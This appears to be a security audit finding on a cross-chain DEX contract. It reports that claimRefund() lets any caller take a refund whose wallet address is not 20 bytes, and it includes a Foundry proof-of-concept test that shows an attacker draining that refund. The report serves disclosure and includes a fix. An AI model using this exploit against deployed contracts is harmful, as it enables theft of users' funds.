# Malicious arbitrary user will withdraw funds from cross chain pool

### Summary

The setting of the receiver variable in the claimRefund() function will cause refunds to be taken by non-affiliated party as malicious actor can claim refund on their behalf.

### Root Cause

In the [GatewayCrossChain.sol](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayCrossChain.sol#L571) file there is a function `claimRefund(bytes32 externalId)` that allows for any external party to claim a refund on behalf of another.

The function fetches a `refundInfo` from memory, based on arbitrary input `externalId`. After this, the `receiver` is set to `msg.sender`, which in an attack scenario is a malicious party. The `receiver` value is only updated if [if(refundInfo.walletAddress.length == 20)](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayCrossChain.sol#L575), which may not always be the case, depending on the specific chain (such as Bitcoin).

If this is the case, this check is bypassed, leading to the `receiver` variable staying as msg.sender, and thus passing [the caller check and the valid refund check](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayCrossChain.sol#L578).

After this, a `safeTransfer` is made to the `receiver` with the value of the refund, leading to arbitrary funds theft for any refund with a `walletAddress.length != 20`.

### Internal Pre-conditions

1. A valid refund needs to be stored in the contract memory, in the refundInfos object.
2. The walletAddress inside that object needs to be `length != 20`

### External Pre-conditions

N/A

### Attack Path

1. User calls claimRefund() with an externalId of a valid refund.

### Impact

The protocol (or end user originally owed the refund) suffers a loss of 100% of the refund value. The attacker gains 100% of this refund value.

### PoC

Run with: `forge test test/GatewayCrossChainRefundVulnerability.t.sol --fork-url https://zetachain-evm.blockpi.network/v1/rpc/public -vv`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {BaseTest} from "./BaseTest.t.sol";
import {console} from "forge-std/console.sol";
import {GatewayCrossChain} from "../contracts/GatewayCrossChain.sol";
import {AbortContext, RevertContext} from "@zetachain/protocol-contracts/contracts/Revert.sol";

/**
forge test test/GatewayCrossChainRefundVulnerability.t.sol --fork-url https://zetachain-evm.blockpi.network/v1/rpc/public -vv
*/

contract GatewayCrossChainRefundVulnerabilityTest is BaseTest {
    function setUp() public override {
        console.log("Starting setUp");
        super.setUp();
    }

    function test_ClaimRefundVulnerability() public {
        console.log("Starting test_ClaimRefundVulnerability");
        // Setup: Create a refund with a non-20-byte wallet address
        bytes32 externalId = keccak256(abi.encodePacked(block.timestamp));
        uint256 amount = 100 ether;
        token1Z.mint(address(gatewayCrossChain), amount);

        // Check initial balances
        console.log("Initial balances:");
        console.log(
            "GatewayCrossChain token balance:",
            token1Z.balanceOf(address(gatewayCrossChain))
        );
        console.log(
            "Attacker token balance:",
            token1Z.balanceOf(address(0x999))
        );

        // Create a refund with a non-20-byte wallet address (e.g., a Bitcoin address)
        vm.prank(address(gatewayZEVM));
        gatewayCrossChain.onAbort(
            AbortContext({
                sender: abi.encode(address(this)),
                asset: address(token1Z),
                amount: amount,
                outgoing: false,
                chainID: 7000,
                revertMessage: bytes.concat(externalId, btcAddress) // Using Bitcoin address which is not 20 bytes
            })
        );

        // Verify the refund was created
        (
            bytes32 id,
            address token,
            uint256 refundAmount,
            bytes memory walletAddr
        ) = gatewayCrossChain.refundInfos(externalId);
        assertEq(id, externalId);
        assertEq(token, address(token1Z));
        assertEq(refundAmount, amount);
        assertEq(walletAddr, btcAddress);

        // Attacker tries to claim the refund (not a bot and not the intended recipient)
        address attacker = address(0x999);
        vm.prank(attacker);
        gatewayCrossChain.claimRefund(externalId);

        // Check final balances
        console.log("\nFinal balances:");
        console.log(
            "GatewayCrossChain token balance:",
            token1Z.balanceOf(address(gatewayCrossChain))
        );
        console.log(
            "Attacker token balance:",
            token1Z.balanceOf(address(0x999))
        );

        // Verify the attacker received the funds
        assertEq(token1Z.balanceOf(attacker), amount);

        // Verify the refund was deleted
        (id, token, refundAmount, walletAddr) = gatewayCrossChain.refundInfos(
            externalId
        );
        assertEq(refundAmount, 0);
    }
}
```

### Mitigation

The `receiver` variable should always be sourced from the [refundInfo](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayCrossChain.sol#L572C41-L572C52) stored in the contract.
